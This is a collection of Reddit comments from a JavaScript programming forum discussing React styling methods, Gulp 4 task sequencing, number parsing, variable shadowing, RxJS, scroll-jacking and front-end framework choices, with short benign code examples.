Amaaaazing. Thanks for your help! Reddit folk are awesome! :) 
Happy to help :)
If you don't understand why many people don't want to adopt yet-another-transpiled-language, then you're the idiot. 
"I understood some of those words lol" needs to die. It's like an anti-intellectual celebration, and the guy lays out exactly the concepts you'd have to read up on to understand the attack.
Yeah [the image he shows](https://fin1te.net/images/facebookxss/xss-fnt-pe-png.png) literally contains the text in the pixel values along the top. Though the data is compressed, hence why he had to un-DEFLATE it.
You have an extra set of parenthesis around the arguments to Math.pow
two things: 1. remove the extra parens in the Math.pow statement (should be: "Math.pow(1 + r, n)" 2. use parseFloat for the annual rate (should be: " var annualRate = parseFloat(document.getElementById('annualRateInputBox').value);") you're getting NaN mostly because: parseInt(".08") === NaN
Maybe I'm a super noob at this, but outside of verbal contracts, what do you mean?
document.body is my personal favourite.
Cordova is okay I guess. Don't do anything demanding with it, though. If you're willing to take a walk on the wild side, javafx with nashorn is pretty sweet.
Who doesn't like &lt;head&gt;?
/u/danneu hit the nail on the head here, man. There are plenty of places here on reddit and elsewhere online where you can goof off and play around. It's your time to spend as you choose. Do your thing there and spare reddits like this one the tired, played out meme, pun chains, et al. None of it is new. None of it is entertaining. It distracts from the purpose of these interest-specific reddits.
`document.documentElement` represents the top-level `&lt;html&gt;` element.
This just looks like a plagiarised rewrite of this article posted in 2015: http://ilikekillnerds.com/2015/07/reversing-a-string-in-javascript-3-different-ways/
Have you looked up an XML parser?
To drive that point home, longcat is looooooooooooooooooooooong.
i honestly don't know much about SAM pattern. but *two way binding*? as far as i know, vue uses two-way bindings for `&lt;input&gt;` controls where two-way binding is *recommended*. in other areas, vue uses one-way binding. you know, I don't mean to say jsx is bad or something. I am just curious to know the areas where jsx is better than vue. PS: now I am looking up sam too.
what lewisje said about xml parser. you want a 'xml parser library' with 'node traversal' .. it works a lot like jQuery or domQuerySelector, `nodes.find('product').where('id', '0002')` basically for the rest you make a form: html 3 lines: &lt;form method=post action="url/to/server/search/script"&gt; &lt;input type=text name=query placeholder="What are you looking for"&gt; &lt;input type=submit value=Go&gt; &lt;/form&gt; maybe its ajax/javascript form, you need to find: "javascript ajax", "javascript get json results"? maybe its html though and this is optional and you make a server side script to query the XML file. for this you can maybe use express or nodejs or php is the easiest. ex server side script in pseudo-code nodejs: route('/search/', 'post', function(req,res){ var xmldata = readfile('myfile.xml') var queryterms = req.body.query // form fieldname, we used &lt;input name=query&gt; var searchresults = xmlnodeslibrary.find(xmldata, 'title' /*name of node*/, queryterms) //format the data: var outputdata = [] for (i in searchresults) output.data.push( { name: searchresults[i].title, link: '/products/'+searchresults[i].id } ) //write the response as Json (for Ajax?), (or you can render the searchresults.html template): res.write( JSON.stringify( outputdata )) })
I use inline styles. I was tempted to do so even before vjeux's presentation because keeping styles in a different file felt weird, esp. since React put all your other component code in one file. I've been fairly happy with it. It makes dynamic/interactive styling easier to reason about, since you can simply transform props into styles without worrying about anything external affecting them.
Both are terrible because they are [slow](http://jsperf.com/string-reverse-function-performance/18), and neither are particularly readable.
thanks!
Never said they were completely new to programming, if they have supplementary knowledge the above should be enough.
Inline. It's especially nice for anything data-driven. 
unless youre reversing a big string or many small strings then I prefer readability to speed here
How do you handle autoprefixing? Is there a library?
There are a lot of libraries in this space trying to solve the inline style problem, most notably is [Radium](https://github.com/formidablelabs/radium). There is also a great [comparison doc](https://github.com/FormidableLabs/radium/tree/master/docs/comparison) in the Radium project as well detailing how some of the alternatives support various features so you know which one is the best fit for you.
Let's have fun. Trampolines! 
say, are you related to author of sam.js? I skimmed through sam.js page, and i believe -- I might be wrong-- that SAM is a step backwards from flux-store. SAM basically tells you to decouple view from model. when you have lots of model talking to each other, data concurrency issues will come. then you will have model data decoupled from model "state" and you have arrived at store pattern. "pure function" term is used as if it is the new buzzword. but basically, you are deriving view from an object. which is effectively what all template languages do.
Less + css modules(using `:local{ .foo{composes: baz from './baz.less'; .myMixin(@yay); color:fade(red,50%);} }` and `import style from './crap.less';` then `.. className={style.foo} ..`) , packed with webpack. So I'm skimming the best of both worlds. ;) It was very confusing to set up this configuration.
It's been quite some time since I've written production code, so I'm not completely current on what needs prefixing. Most of what I do is mobile prototyping. Last year, `flex` and `transform` needed prefixing on iOS, but that's been fixed. I put [this](https://github.com/appsforartists/autoprefix-style-prop) together to do that prefixing until iOS got its shit together.
I've been chatting with him on the gitter channel for a while. The link I provided explains it. But it's a step forwards. 
Inline with Radium for more rapid development, but then I move styles to CSS once they become more stable/permanent. Generally my styles exist in 3 states, and from least stable to most stable are: 1. style={{ key: "value" }} 2. style={[styles.rule_1, styles.rule_2, etc]}, where styles is some object with different rules 3. className="rule-1 rule-2" where I've translated the styles object into CSS, which is really quick and easy There are benefits to all three ways so I try to use them all accordingly 
Just wanted to point out that unless you have a specific need to use arrays, it would probably be easier to use an object. var namesSales = [ { name: "George", sales: 300 }, { name: "Chris", sales: 245 }, { name: "Craig", sales: 432 }, { name: "Taylor", sales: 167 }, { name: "Tom", sales: 355 } ]; function bySales(a, b) { return b.sales - a.sales; } var sorted = namesSales.sort(bySales); console.log(sorted);
Haha, I think you're reading a bit too much into this.
Or WebStorm, Atom, Sublime Text, Eclipse, or whatever might come to be supported in the future. 
I don't think he's arguing against exploring other ideas ;) Just that, at present, all Javascript libraries would be easier to consume if they were written in TypeScript. And since that is the main point of a library, that would be preferred. That said, I think it's a bit too much to consider TypeScript a "different language". It's Javascript with some additional compile-time guarantees.
Using LESS for global styling, the main layout, theming and such (mainly because it was already there when we moved to React). But for component-specific styling I'm getting used to inline styling more and more, especially when styles are state-dependent. But while this divide is there mostly for legacy reasons, I also see no convincing reason to do it otherwise.
I chuckled .. Was reading the README on the project .. couldn't help but read it like this after the first few lines import * as sagas from './sagas' import createThagaMiddleware from 'redux-thaga' consth thaga = createThagaMiddleware(sagas) consth createSthoreWithMiddlewareth = applyMiddleware(thaga)(createSthore) 
The breaking changes are to the V8 API used by embedders such as Node.js, Chromium and million others.
Well, I'd prefer speed regardless. If you name it "reverseString" and see it being called in code, the only reason I would have to read its implementation is to see how optimized it is. I wouldn't have to read its code to know what it does because it's in this case so obvious. Afaik the fastest way to do it is to read the charcodes of the string into an Uint16 array in reverse order and then just call an utf16 TextDecoder's decode method on it. This avoids doing a separate string allocation for every character and is not exactly unreadable either.
I really like Angular 2. It's full-featured and totally usable in it's current state. I'm developing a mobile app that will be shipped in a cordova container in the future as well and it's really a joy to work with.
&gt;var getRating == getSelectedValue(); This is not how you would do variable assignments. You only need one equal sign, not too. Looks like you need to go back to learning the basics tbh. 
I'm not used to HTML5 and javascript, I primarily use just java, and although you don't do this in java either it was just something I was trying to see if it was a syntax error stopping the function from running.
This works well and the collision detection is cool, plus it's nice to see the collider boxes
React, because it's not only a great UI construction tool, but also because it teaches you some good and useful patterns.
We use CSS Modules with webpack's css-loader. Can't recommend it enough. Check out this great article on it by Glen Maddern, one of the guys that works on it. http://glenmaddern.com/articles/css-modules We also make a lot of use of the class composition feature, so we can still get a lot of reuse.
Potato potato, I think. They can still be used by Javascript programs without modification, but with added autocompletion and better docs.
Is there a roadmap for the release of Gulp 4? I can't seem to find anything online about it. This would fix a lot of my current pain-points with Gulp 3.
If you're looking at something different to React - http://aurelia.io/ Very focused on the developer experience, bundles most things you need to get going (which some might say is a bad thing). Would pick it up over Angular 2 if you don't go for React/Flux et al. 
Me neither, I think it's like it will be done when it's done kind of thing. Hopefully soon.
That's awesome! I'm going to try this and see if it will work out, but I'm a total noob at js so I'm quite dumb on this, lol. Thank you a thousand times over for your help!
I was under the impression that it's still the same stream based stuff that it was before but with a better api 
You can track the issue here https://github.com/gulpjs/gulp/issues/1486
I guess this is neat in a this-is-possible sort of way. But creating singletons through inheritance is such an impractically terrible idea. Please no one do this.
I still find Webpack confusing. Never found a decent tutorial on it. Gulp makes sense to me. Anything useful out there you can link me to at all?
This is great to hear, although I prefer the terser syntax offered by the package gulp-sequence: gulp.task('default', gulpSequence('clean', ['styles', 'scripts']))
It really depends. I have production apps in React and Angular. I have used Ionic2 (which uses Angular2) and love it. I have been playing with Aurelia recently and am writing my next app in it. I use TypeScript for both. I still maintain my React apps, which I enjoyed working with. I tried Ember but it was too much ceremony for me (just a personal opinion, I also wasn't a fan of Rails on the backend and prefer Go's model of libraries over frameworks). I would say try a couple and see what fits. If you want to learn something to apply knowledge, I strongly recommend Aurelia; it focuses on staying out of the way; you pretty much just write ES2015 classes or TypeScript classes and the framework will glue things together behind the scenes.
Yes.
[**@mrrrgn**](https://twitter.com/mrrrgn): &gt;[2016-03-16 23:46:32 UTC](https://twitter.com/mrrrgn/status/710250932764672001) &gt;Near to adding another nice feature to the ff console, links to docs from error messages! =&amp;gt; [*imgur.com*](http://imgur.com/EOztwbI) [*bugzilla.mozilla.org*](https://bugzilla.mozilla.org/show_bug.cgi?id=1255133) ---- [^[Mistake?]](/message/compose/?to=TweetPoster&amp;subject=Error%20Report&amp;message=/4at68j%0A%0APlease leave above link unaltered.) [^[Suggestion]](/message/compose/?to=TweetPoster&amp;subject=Suggestion) [^[FAQ]](/r/TweetPoster/comments/13relk/) [^[Code]](https://github.com/joealcorn/TweetPoster) [^[Issues]](https://github.com/joealcorn/TweetPoster/issues) 
That is maybe a way of saying "if you know a framework that your comfortable with, you can use that".. but OP has not stated they are strong with any frameworks. so giving them framework based feedback isn't the most helpful suggestion
Love it. Kudos to the gulp team.
Could it be that Gulp's syntax is more flexible? I you have something more complicated like this, I guess that an more explicit syntax would be help. The counter argument might be, that you should be creating subtasks for such a setup. B - C --- / \ Start - E - Done \ / \ / D - -- \ / F
Many libraries can just use [jsdom](https://github.com/tmpvar/jsdom) to test DOM/CSS without an actual browser. If the code needs to run in a real browser (e.g. uses some browser API that jsdom doesn't support), you can try [testling](https://github.com/substack/testling) or [smokestack](https://github.com/hughsk/smokestack) which can launch a browser and pipe TAP back to terminal. Another approach is to use [tape-run](https://www.npmjs.com/package/tape-run), which can run regular browsers, Electron, or PhantomJS. For local development/testing, instead of using `node test.js` or `nodemon test.js`, I tend to use [budo](https://www.npmjs.com/package/budo) to serve `test.js` for a browser. Here is a practical example of a module that uses smokestack to test in a real browser: https://github.com/mattdesl/dom-css/blob/cd58bf1840c3f748e73a632daa3a38d1dfcc1255/package.json#L26
Surely better off just creating a module that defines a class then exports a single instance.
Why did they rewrite to es5?
Thank you!
You can browserify the tape test. It will still print to the console, so might be inconvenient to check results for manual runs. There are CI integration scripts/harnesses for automated runs. 
&gt; WebAssembly lets you write code in C/C++ that can run in the browser. So far the uses for WebAssembly are the same as ASM.js - Unity engine games in the browser. That is not going to replace writing JavaScript for websites and apps. WebAssembly has a specific use case which is limited by its very nature. I know that the *primary* goal of WebAssembly is to allow compilation of C/C++ code and faster, more low level access, but I was under the impression that WA would *also* allow access to the DOM API, thereby circumventing the usual pain of writing apps without it that you described with cgi-bin. Is this not the case? I admittedly haven't kept up on it much since it was announced. &gt; Game developers write in C/C++ but occasionally they need to drop down to Assembly code for bare metal performance. Nobody writes a game in just Assembly. I... wasn't suggesting anything of the sort? I was specifically saying that other languages might choose to *compile to* WA. And that assuming WA has DOM access, you could in theory replace Javascript with WebAssembly code that was compiled from, say, Python or Ruby (assuming someone writes a compiler for them). &gt; I think WebAssembly's fate will be determined by mobile. If WebAssembly doesn't fare well on mobile, it will wind up in the same situation as Flash. This I can wholeheartedly agree on. Mobile has become such a massive focus for web development that it's very much a linchpin in whether web standards gain traction nowadays. That said, most mobile browsers support WebGL (at least partially), so supporting WebAssembly doesn't seem like much of a stress by comparison. 
I use Grunt. There is nothing broken with Grunt. It does everything that you expect a build tool to do. And until Grunt is no longer a supported project, it is an inexcusable waste of my salary to move my projects over to anything else solely for superficial reasons (yes yes, Gulp might be faster which is not superficial, but it's not like you're rebuilding your entire application every time you change a line of code). Now replace the word "grunt" with the word "gulp". One day, you'll want to replace the word "gulp" with "webpack" too when the next new and shiny build tool comes out.
&gt; currently taking off That is the sound an echo-chamber makes.
I think placing the styles in JavaScript makes total sense. Of course not all of them. The main styles for layout, typography and coloring should be in static files so the browser loads them fast. There are plenty of variants for writing CSS-ish syntax along with JSX and JS logic - csjs, Radium, css modules. I myself started using [CSSX](https://github.com/krasimir/cssx). [Here](https://github.com/krasimir/react-cssx) is an React example.
Probably to support old versions of `node` without a transpiler.
Because it's faster than what Babel was generating. Now everything runs in the order of milliseconds.
I would suggest Angular 2 for the long term. Typescript is awesome (especially if you were already using typed OO languages before), it will make your project way more maintainable and the structure that the framework has is very clean and understandable for everyone (backend and front end devs). I also like that Angular2 offers everything I need to build a webapp and that it will be stable and ''future'' proof compared to the other custom made stacks.
Also, you're defining the progress event listener twice.
Makes sense, thank you.
It's very close, take a look at the [milestones](https://github.com/gulpjs/gulp/milestones/gulp%204), once the 9 have been resolved, gulp4 is officially out of beta methinks. I'm reminded of this while stating this: https://youtu.be/rbGGyyYE7Ks?t=2m28s 
I'm not too experienced with anything outside of Vue and React, but Vue is very beginner-friendly. It isn't as jargon-y as other frameworks/libraries and the documentation is well written. I highly recommend it as a first framework for anyone. It doesn't kill you with complicated concepts and has a nice learning curve. +1
Gulp 4 support promises for any task (or a callback or a stream)
I'd agree; with React, you're writing mostly ES6 with a _small_ amount of React's framework syntax; it's more of a library than a framework. Writing code using frameworks like Angular requires a lot more specific Angular knowledge; you're writing mostly Angular specific code.
It's actually either/both. You can still return streams like km Gulp3, or you can return a promise (or call `done()`)
When the href is empty, it causes the browser to reload the entire page. When the href is "#", is causes the browser to jump to the top of the current page without a reload. "#" is used to link to anchors within a document.
Learn ReactJS + Redux. Both are minimalistic frameworks, so that ReactJS will strength your javascript and functional programming intuition. Redux will make you learn about data immutability. I personally find Angular too monolithic, so if you are not experience in more basic concepts, you'll get stuck with the "Angular Way". 
Not really, that was never it. I just wanted to use ES6 to the fullest, because, like, fun.
For what it's worth, the current trend seems to be against scroll-jacking.
I agree, dont do this
Jesus - gulp 4 has been in 'dev stage' for well over 1.5 years. Why did they rebuild a task manager from scratch? All of the components necessary to handle everything already exist - I've used the vinyl fs decoupled from gulp for the same amount of time (over 1.5 years). It's literally a thin wrapper over node steams with a meta data fs module - you can compose the streams together for data flow any way you like - ordered / parallel - and utilize the entire ecosystem with vinyl alone. The delay when using gulp command globally is sometimes longer than the all the tasks combined. Don't return streams - that's the best advice I can give. Handle the streams proper.
Hi /u/zeniface, this post was removed. Please see our [posting guidelines](http://www.reddit.com/r/javascript/wiki/index).
No, I didn't make a mistake, people are just being retarded...although, I would like to know...how the heck do you learn all that stuff.
Ditto, we write Scss files then just import them at the top of the file. simple and clean. edit: Personally, I'm a fan of keeping Scss completely separate from program logic. As a Dev, I don't care if something is a given color/width/whatever, the html structure is still the same. Class names should be descriptive enough to indicate what style it imparts, so reasoning about that kind of logic is rather moot.
While I agree for the most part, there are definitely times where you do want to "scroll-jack". For instance, the example page (in my original post) blocks scrolling until the page loads, which is necessary because it would ruin the formatting/animation/experience if you scrolled during the loading screen.
Yes, the distributed library, most likely also digested and spit out by a minifier, a bundler and what have you.
hmm, that is actually a good point. it would be more true if dist files were the only option. but many dev --or maybe only me-- use non - minfied during development. and uglify the code at production time only. though, i completely agree with your point.
Thank you! this is pretty much what I am looking for. Do you know if there is a way to disable this after the first scroll gas taken place?
See my comment above about fly, that's kind of how it works, if not exactly how it works.
The chained calls is the order of calls. You'd go clean -&gt; styles, scripts. If you treat them like promises this makes more sense. So this would equate to Promise.reduce().all(). You could endlessly chain them. `Reduce` waits if the iterator returns a promise before continuing iteration. `All` runs through them all and waits for all promises to resolve before continuing. It translates seamlessly to `gulpSequence`. Each `series` translates to an individual param and `parallel` translates to an array. The only difference is the fluent interface. 
Cause with classes, it'll be like this... class Animal {} class Dog extends Animal {} class Cat extends Animal {} ...whereas with straight prototypes, it'll be like this... let animal = {}; let dog = Object.create(animal); let cat = Object.create(animal); Obviously totally different. ;-) All due respect to Crockford, but I don't see how he thinks prototypes eliminates taxonomies. And his "ya huh, nuh uh" argument he had with himself in the video didn't help explain his thinking.
So that could translate to me as `gulp.parallel(D, B).parallel(C, E, F)` B &amp; D can run in parallel, when both complete you can now run C, E, F all in parallel. If you really want C to start immediately after B is done, you could use subtasks and create the following: Start gulp.parallel(D, B) Subtask B gulp.series/parallel(C) Subtask D gulp.parallel(E, F) You could also make `series` &amp; `parallel` behave like gulp's version and accept a `series` or `parallel` for people who really want C to start immediately after B finishes. If you do that there is no difference other than providing more flexibility for writing your calls.
Reading this just makes me wonder why the Polymer library isn't more popular. https://www.polymer-project.org/1.0/
No problem! Gas?
Haha sorry, meant *has instead of gas.
Ah! And thanks for gold! :)
Can you give a code example?
&gt; I would like to know U WOT M8
get Panda and subscribe to EchoJS and Lobsters
Depends on what you're doing and why, but your good ole friends `parseInt` and parseFloat` are helpful. Using these functions and also the `Number` constructor will just return `NaN` if they are invalid. And you can check for that with `isNaN` It's also pretty straightforward to use a regex if you'd like to go that route
He doesn't think they eliminate taxonomies (i don't think that's what he's saying). The argument is that when you make an application from scratch the segregation of code into different classes initially isn't as clear as it should be (thus OOP docs / modelling). You don't know which bit of code belongs to what class intuitively (thus how design patterns came into being). With the prototype modelling it's less of a concern having to worry about lexical scopes within an independent filesystem is what i think he's saying.
For people that actually wanna ship products, you should check out Webpack. It takes care of resolving your whole dependency graph and outputting it sanely. That includes watching for changes and handling source maps correctly. 
One nice thing about it from the docs: &gt; If parseInt encounters a character that is not a numeral in the specified radix, it ignores it and all succeeding characters and returns the integer value parsed up to that point. parseInt truncates numbers to integer values. Leading and trailing spaces are allowed. So it means you can call something like `parseInt("15px", 10)` and the result will be 15** but if for example you wanted a more strict approach, you could use a regex and restrict it to only numerical characters
Why do you think users want to stare at a loading screen instead of scrolling a partially loaded document?
This is known as shadowing. If you have a variable in an inner scope with the same name as a variable in an outer scope, that inner variable takes precedence and shadows the outer scoped variable. The variable in that outer scope is inaccessible in the inner scope then and the inner scope variable, like any other variable in the inner scope, doesn't bleed out into that outer scope and affect anything there, letting the outer scope's version of that variable remain unaffected.
When you refer to an identifier, there's a defined order of what is searched to resolve that reference. First the local variables and function parameter names are checked, and only if there's no match then the next outer scope is checked, and so on until you reach the global scope. The lookup stops as soon as there's a match. `view` is a parameter, so the search ends after the first step. The fact that there is also a `view` in the enclosing scope is irrelevant, because that is never checked. 
Adding debugger in your code allows you to stop code and inspect values as well as step through the remaining code.
I also feel that RxJS doesn't seem to get the blog exposure that it deserves for the amazing benefits that it provides. People often reference a difficulty to learn as a barrier to entry, but personally I found the opposite, as it is so freeing from many of the JavaScript quirks that can pop up in async handling. After learning to use it, I have a hard time not including it on projects, since it is so beneficial to my coding flow. The [NPM page](https://www.npmjs.com/package/rx) lists it at just over 1M downloads per month, so I wouldn't exactly consider it unheard of however. To the question of using RxJS in projects, that would depend on which version you're looking at: * [Version 4](https://github.com/Reactive-Extensions/RxJS) is the current stable version, has over 1M downloads per month, and I believe that it was used in the [development of the Netflix user interface](https://youtu.be/XRYN2xt11Ek), so I'm quite sure you can trust it in your own projects. * [Version 5](https://github.com/ReactiveX/RxJS) is the in beta, complete rewrite, with breaking syntax, that aims to align itself with the ES7 Observable Spec. This is my preferred version, but it still shows its beta status from time to time, and I would restrict its use to small personal, or in house projects at this time... at least until the stable version lands. Also it could probably use a little more beginner friendly documentation, but I'm sure that will come in time. 
I didn't assume anything. The scrolling does ruin the formatting/animation/experience. Did you look at the page before you commented? Also your comment is saying that because you don't like scroll jacking everyone must not like scroll jacking, do you have evidence to back this up? or are you just saying this as anecdotal evidence?
In your case, it requires a bit more ungrouping of tasks. I could be missing something, but this seems to be the way to do it. // compiles files gulp.task( "compile", gulp.parallel( "compile:js", "compile:scss" ) ); // pushes files via sftp gulp.task( "sftp", function() {...} ); // commits to git gulp.task( "git", function() {...} ); // compiles files and pushes via sftp and commits to git gulp.task( "publish_all", gulp.series( "compile", gulp.parallel( "git", "sftp" ) ) ); // compiles files and pushes via sftp gulp.task( "publish_sftp", gulp.series( "compile", "sftp" ) ); // compiles files and commits to git gulp.task( "publish_git", gulp.series( "compile", "git" ) ); Hope this helped. 
This links to the [very] long list of improvements to Marko v3. If you haven't used Marko you might find the official Marko v3 announcement more interesting: [Announcing Marko v3: From HTML to HTML-JS](http://markojs.com/blog/announcing-marko-v3/)
&gt; The scrolling does ruin the formatting/animation Stop there. Do not include "experience" in your statement. Experience is the sum total of what the site offers. Formatting/animation being "ruined" is only part of the experience. So is fucking with the behavior of my mouse. It's your OPINION that the formatting/animation is the important part of the experience. That's not *MY* opinion, and I am your user, so I'll leave it to you if you want to take that into account. At any rate, yes, I did check out the page, and I don't see the issue. Like literally every other website, the more I scroll, the further down the page I go. I have my scroll wheel set to a very high level, so a "hard scroll" will indeed send me down past the point you think I want to be at. But in reality, I want to be where I expect my scroll wheel to take me. If I scroll too far, I'll scroll up. If the animation of the phone fading out is fucked, fix the animation, don't block the scrolling. You can very easily make it so that the phone immediately disappears when you've scrolled too far if you're that concerned about it. Also, seriously hate that the header disappears and I can't scroll back to it. Permanent page transformations based on scrolling are another form of scroll jacking. It's disorienting.
I see your point, however, to say that animation and formatting are not part of the experience I would say is incorrect. I put all three in there because they are not mutually exclusive, they all affect each other. I mainly work in website optimization and even small animations can change user behavior (for better or worse) significantly. Sometimes animations, formatting and different effects can give the user a different perception of the brand/company and can cause them to buy more, more expensive or up sell products (it can also have the opposite effect). To just globally assume that scroll jacking is always bad and always causes the user to perform an undesired action would be a pretty strong assumption without data backing it up. Totally agree with the header part, I am definitely going to change that. Edit: Format and added a sentence.
The behavior between `+` and `Number` is identical, but different compared to `parseInt`: +[] &gt;&gt; 0 +{ toString() { return 5; } } &gt;&gt; 5 +'5 and some other junk too' &gt;&gt; NaN parseInt([], 10); &gt;&gt; NaN parseInt({ toString() { return 5; } }, 10); &gt;&gt; 5 parseInt('5 and some other junk too', 10); &gt;&gt; 5 So it really depends what kind of data you expect to send to it, and how tolerant you want it to be. Mostly, if you want to parse strings like "63 cows" as "63" or `NaN`. You can see the exact results of various data sets [here](http://jsfiddle.net/EpUBN/8/).
He didn't say that they aren't part of the experience, he disagreed that ruining the animation and formatting in turn ruins the experience. The experience is, as he says, completely opinion based. For example, I don't care if animation/formatting is ruined. So the experience is not ruined for me. What does ruin the experience for me, is pages not scrolling when I want to scroll. Seeing a few out-of-place animations or whatever is a mild annoyance but I want to get on with consuming the content of the page and damn the animations.
It really depends. Does front loading the options impact performance? If not then I see no need for a change.
&gt; I believe in (I know it's not too popular with some people) separation of concerns. I don't like having my styling done in code. The people using inline styles believe in separation of concerns too. A dumb React component that accepts some props and renders them has a *single* concern. Splitting some arbitrary part of the component out into a different file isn't separation of concerns. (Disclosure: I use css modules, less, and webpack; all my CSS are in seperate files, for a variety of reasons. It's just that "seperation of concerns" isn't one of them, and there's an obvious drawback of having a folder full of `CustomButton.js`, `CustomButton.less`, `DashWidget.js`, `DashWidget.less`: The fact that I'm splitting code that handles a single concern into different files.)
I mean, I guess creating an extra task pr. task is a solution, but it's a fairly ugly solution. I just can't follow the logic behind removing the dependency system if it means breaking what, at least in my opinion, is a fairly common usage pattern.
Do you have any examples of how you've done this? I fancy taking a look.
Great to see this. I'm a big fan of feathers.
http://www.merriam-webster.com/dictionary/experience An experience is not how you perceive or feel about something, it is the process of doing and seeing things and of having things happen to you. Therefore you can have a good experience, bad experience, etc... However if something disrupts the intended experience, then that experience would be different from intended and therefore ruined. Experience is not opinion based, your feelings and thoughts towards the experience is. I never said that scroll jacking can't affect someone's opinion of an experience, however, in this instances scrolling changes the intended experience. I feel like I am just getting pedantic at this point, sorry about that.
Keifer is a lighter weight alternative.
You've had several people tell you today that they don't care about the animations or formatting, and that it doesn't damage their experience of your site when they are broken, yet you choose to hide behind the semantic meaning of experience instead of realising your choice to prevent your users from getting to the content is harmful.
Just a typo: the result will be 15, not 10.
Let's dispel once and for all with this fiction that Marko doesn't know what he's doing. He knows EXACTLY what he's doing. Marko is undertaking a systematic effort to change the efficiency of server side rendering, to make the web more like fast and stuff.
Does it provide full duplex communication? Also, what sort of buffering/backoff strategy does it have for connection loss situations?
What other languages do you know? What style are you hoping to code in with JS? OOP? Functional?
Thanks for the answer!
Thanks for the answer. Is it bad practice to work this way? In my case `view` is a method of `update`. This came about because I saw it as a logical parameter name in the context. 
I can't believe I have to say this again: You are using anecdotal evidence to claim something that you have no data on. I don't care if 100 people on this site told me something, what matters is if it is statistically significant or if there is evidence to back it up. No one on this thread has provided any studies or research, they are just saying what they feel (as you are too). I am not being semantic, you were just wrong and I was correcting you, nothing semantic about it. I truly don't care about what your opinion is on certain aspects of websites, what I do care about is the people using my site having the experience that is intended. None of the people commenting have even asked about the demographics or what the target audience of the site will be, so just saying that scroll jacking is bad as a blanket statement is ignorant. I actually happen to agree that scroll jacking is annoying, but I am not arrogant enough to think that there can't be useful applications for it or that some websites may be able to actually offer a better experience with scroll jacking. If you have done any testing to prove that my "choice to prevent users from getting content is harmful" I would love to see that data. 
I've submitted this link before, but I wanted to re-share it because of all the changes I've made to my code! I hit version 3.1 and the API is much more stable now. Please have a look and try it out at http://requirebin.com/?gist=7d819d5ab7eac782353e
&gt; When I do have a legit project that really needs it RxJS is one of those things that once you get your head around it (it does take time!) you'll notice it can be useful in a lot of places that you usually wouldn't consider it to be. For example, imagine authentication via a socket.io application. I could do something like: const user$ = Rx.Observable.merge( Rx.Observable.fromEvent(socket, "login").do(user =&gt; user.isLoggedIn = true), Rx.Observable.fromEvent(socket, "logout").map(() =&gt; {isLoggedIn: false})) .startWith({isLoggedIn: false}) .publishReplay(1); user$.connect(); And, elsewhere: auth.user$.subscribe(user =&gt; { body.classList.toggle("logged-in", user.isLoggedIn); }); With those few lines of code, an event from socket.io "login" will automatically notify all code subscribed that the user is logged in, and logout would clear that. Or, maybe: Rx.Observable.fromEvent($("#do-something"), "click") .do(e =&gt; e.preventDefault()) .withLatestFrom(auth.user$, ([_, u]) =&gt; u) .filter(user =&gt; u.isLoggedIn &amp;&amp; auth.canUser(user, "something")) .mergeMap(() =&gt; service.doSomething$()) .subscribe(displayResult); With this, we're combining reactive programming (handling the event) with something that we'd typically only use promises for (mergeMap roughly translates into Promise.then). It's worth the learning curve. But there *is* a learning curve. Just like functional programming. Remember back when everyone said that "functional programming is too complex and why change!?" and completely ignored it? Yet today we consider it to be practically required for modern programming. The same thing is happening with reactive programming.
Whoops! Thanks :p
Well if you've just started getting into React why don't you keep doing CSS how you've been doing it? Once you get a handle on React and all the tooling and new stuff it requires you to learn then you can learn a new way to implement CSS.
Neat. F# and C# are on the most loved list. Weird to see coffeescript on the most hated list but not any of the languages that influenced it, and also kind of weird to see SQL on there. Do people really hate SQL that much? I know the joke is we went from "know sql to no sql" but still. Some other take away is the huge drop in haskell, and non-negligible drop in scala and F#. I wouldn't have expected that. Maybe they're just stabilizing at a more regular population? Also, to the surprise of no one, react is off the charts in terms of trending. Node also seems to be growing more trendy from year to year from those results. 
 import {styles} from './styles.scss'; export class InstanceManager extends Component { render() { return ( &lt;div className={styles}&gt;&lt;/div&gt; ) } } then just have a styles.scss in the same directory as the component. :local(.styles) { background: #333; }
&gt; Do people really hate SQL that much? I suspect that is because most people have a difficult time visualizing data as sets. Using SQL isn't just about S/I/U/D operations, but how to conceptualize the data.
I syggest this article: https://developer.mozilla.org/en-US/docs/Web/JavaScript/A_re-introduction_to_JavaScript . It really helped me to understand I didn't know JS even if I used it for several years.
This is how I handle that: - Each component has its own css file with naming like: `ComponentNameStylesheet.css`. - Abstracting common styles is handled by the class composition feature available with [CSS Modules](https://css-modules.github.io/webpack-demo/). - Classname binding is handled with the `.bind` api from the [Classnames](https://github.com/JedWatson/classnames) module. - Sometimes you also need inline styles, so I'll show that too. ## Example 1 ### Component import React from 'react'; import classNames from '../styles/SomeComponentStylesheet.css'; export default class SomeComponent extends React.Component { render () { return &lt;div className={classNames.this} /&gt;; } } ### Styles .this { composes: pageHeading from './typography.css'; font-size: 26px; } ## Example 2 ### Component import React from 'react'; import classNamesContext from '../styles/SomeComponentStylesheet.css'; import classNames from 'classnames/bind'; const cx = classNames.bind(classNamesContext); export default class SomeComponent extends React.Component { render () { return &lt;div className={ cx({ this: true, underline: Math.random() &gt; 0.25, }) } /&gt;; } } ### Stylesheet .this { composes: pageHeading from './typography.css'; font-size: 26px; } .underline { composes: underline from './typography.css'; text-decoration-color: green; } ## Example 3 ### Component import React from 'react'; import classNamesContext from '../styles/SomeComponentStylesheet.css'; import classNames from 'classnames/bind'; const cx = classNames.bind(classNamesContext); const styles = { this: {}, }; export default class SomeComponent extends React.Component { static propTypes = { color: React.PropTypes.string.isRequired, }; render () { const {color} = this.props; const showUnderline = Math.random() &gt; 0.25; // or some state variable styles.this.backgroundColor = color; return &lt;div className={ cx({ this: true, underline: showUnderline, }) } style={styles.this} /&gt;; } } 
Do you mean the actual design of the database or the process of projecting the database into a way that you can understand your data? I was thinking database design might have been part of it.
I know you're being a bit silly, but the areas javascript did well is as a language with a lot of votes, a lot of people using it, and being in the top 10 "most wanted" languages. Not anything to do with the number of questions asked. :) (though [javascript "wins" there too](http://stackoverflow.com/tags?tab=popular))
Hey! So far I've taught myself Ruby and the Sinatra and Rails frameworks, and I use FileMaker a lot at work. I don't know about a targeted style yet, that's the first I heard of JS styles!
